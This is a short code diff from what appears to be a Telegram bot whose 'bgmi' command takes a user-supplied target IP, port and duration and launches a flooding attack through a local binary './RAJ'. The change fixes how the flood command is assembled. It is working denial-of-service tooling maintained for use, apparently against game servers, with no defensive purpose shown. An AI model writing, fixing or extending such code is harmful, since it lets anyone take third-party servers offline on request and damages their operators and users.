@@ -148,7 +148,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./RAJ 512 1200', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./RAJ', target_ip, port, duration, str(DEFAULT_THREADS)]
     
     # Select a random image URL
     random_image = random.choice(IMAGE_URLS)
